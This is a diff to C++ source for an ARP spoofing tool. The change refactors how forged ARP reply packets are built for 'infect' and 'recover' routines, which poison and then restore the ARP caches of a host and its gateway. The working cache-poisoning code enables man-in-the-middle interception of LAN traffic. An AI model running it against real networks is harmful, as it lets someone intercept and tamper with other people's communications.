@@ -168,10 +168,8 @@ Flow ArpSpoof::detect(Packet* packet)
 
     if (!detected) return host;
 
-    host.smac_ = mac;
-    host.sip_ = ip;
-    host.tmac_ = gwMac_;
-    host.tip_ = gwIp_;
+    host.mac_ = mac;
+    host.ip_ = ip;
     struct timeval now;
     gettimeofday(&now, NULL);
     host.lastAccess_ = now; // for check 15min
@@ -212,13 +210,11 @@ bool ArpSpoof::sendQuery(Ip tip)
     return true;
 }
 
-bool ArpSpoof::sendInfect(Flow flow)
+void ArpSpoof::makeArppacket(Mac dmac, Mac smac, Mac tmac, Ip tip, Ip sip)
 {
-    spdlog::info(string(flow.tip_)+" "+string(flow.sip_));
-    EthArpPacket packet;
-
     EthHdr *ethHdr = &packet.ethHdr_;
-    ethHdr->smac_ = intf_->mac();
+    ethHdr->dmac_ = dmac;
+    ethHdr->smac_ = smac;
     ethHdr->type_ = htons(EthHdr::Arp);
 
     ArpHdr *arpHdr = &packet.arpHdr_;
@@ -227,14 +223,20 @@ bool ArpSpoof::sendInfect(Flow flow)
     arpHdr->hln_ = Mac::SIZE;
     arpHdr->pln_ = Ip::SIZE;
     arpHdr->op_ = htons(ArpHdr::Reply);
-    arpHdr->smac_ = intf_->mac();
+    arpHdr->smac_ = smac;
+    arpHdr->sip_ = htonl(sip);
+    arpHdr->tmac_ = tmac;
+    arpHdr->tip_ = htonl(tip);
+}
 
-    //  gateway send
-    ethHdr->dmac_ = flow.tmac_;
-    arpHdr->sip_ = htonl(flow.sip_);
-    arpHdr->tmac_ = flow.tmac_;
-    arpHdr->tip_ = htonl(flow.tip_);
-
+bool ArpSpoof::sendInfect(Flow flow)
+{
+    spdlog::info(string(flow.ip_));
+    //  sender send
+    {
+        std::lock_guard<std::mutex> lock(m);
+        makeArppacket(flow.mac_,intf_->mac(),flow.mac_,flow.ip_,gwIp_);
+    }
     Packet::Result res;
     for (int i = 0 ; i < 3 ; i++) {
         res = write(Buf(pbyte(&packet), sizeof(packet)));
@@ -246,11 +248,10 @@ bool ArpSpoof::sendInfect(Flow flow)
     }
 
     //  target send
-    ethHdr->dmac_ = flow.smac_;
-    arpHdr->sip_ = htonl(flow.tip_);
-    arpHdr->tmac_ = flow.smac_;
-    arpHdr->tip_ = htonl(flow.sip_);
-
+    {
+        std::lock_guard<std::mutex> lock(m);
+        makeArppacket(gwMac_,intf_->mac(),gwMac_,gwIp_,flow.ip_);
+    }
     for (int i = 0 ; i < 3 ; i++) {
         res = write(Buf(pbyte(&packet), sizeof(packet)));
         std::this_thread::sleep_for(std::chrono::milliseconds(sendSleepTime_));
@@ -259,35 +260,17 @@ bool ArpSpoof::sendInfect(Flow flow)
             return false;
         }
     }
-    spdlog::info("Arpspoof::infection::success "+std::string(flow.tmac_)+std::string(flow.tip_)+std::string(flow.smac_)+std::string(flow.sip_));
+    spdlog::info("Arpspoof::infection::success " +std::string(flow.mac_)+" "+std::string(flow.ip_));
     return res;
 }
 
 bool ArpSpoof::sendRecover(Flow flow)
 {
-    spdlog::info(string(flow.tip_)+" "+string(flow.sip_));
-    EthArpPacket packet;
-
-    EthHdr *ethHdr = &packet.ethHdr_;
-    ethHdr->dmac_ = Mac::nullMac();
-    ethHdr->smac_ = intf_->mac();
-    ethHdr->type_ = htons(EthHdr::Arp);
-
-    ArpHdr *arpHdr = &packet.arpHdr_;
-    arpHdr->hrd_ = htons(ArpHdr::ETHER);
-    arpHdr->pro_ = htons(EthHdr::Ip4);
-    arpHdr->hln_ = Mac::SIZE;
-    arpHdr->pln_ = Ip::SIZE;
-    arpHdr->op_ = htons(ArpHdr::Reply);
-    arpHdr->smac_ = Mac::nullMac();
-    arpHdr->tmac_ = Mac::nullMac();
-
-    //  gateway send
-    ethHdr->dmac_ = flow.tmac_;
-    arpHdr->smac_ = flow.smac_;
-    arpHdr->sip_ = htonl(flow.sip_);
-    arpHdr->tmac_ = flow.tmac_;
-    arpHdr->tip_ = htonl(flow.tip_);
+    spdlog::info(string(flow.ip_));
+    {
+        std::lock_guard<std::mutex> lock(m);
+        makeArppacket(gwMac_,flow.mac_,gwMac_,gwIp_,flow.ip_);
+    }
 
     Packet::Result res;
     for (int i = 0 ; i < 3 ; i++) {
@@ -300,11 +283,10 @@ bool ArpSpoof::sendRecover(Flow flow)
     }
 
     //  target send
-    ethHdr->dmac_ = flow.smac_;
-    arpHdr->smac_ = flow.tmac_;
-    arpHdr->sip_ = htonl(flow.tip_);
-    arpHdr->tmac_ = flow.smac_;
-    arpHdr->tip_ = htonl(flow.sip_);
+    {
+        std::lock_guard<std::mutex> lock(m);
+        makeArppacket(flow.mac_,gwMac_,flow.mac_,flow.ip_,gwIp_);
+    }
 
     for (int i = 0 ; i < 3 ; i++) {
         res = write(Buf(pbyte(&packet), sizeof(packet)));
@@ -314,7 +296,7 @@ bool ArpSpoof::sendRecover(Flow flow)
             return false;
         }
     }
-    spdlog::info("Arpspoof::recover::success "+std::string(flow.tmac_)+std::string(flow.tip_)+std::string(flow.smac_)+std::string(flow.sip_));
+    spdlog::info("Arpspoof::recover::success " +std::string(flow.mac_)+" "+std::string(flow.ip_));
     return true;
 }
 
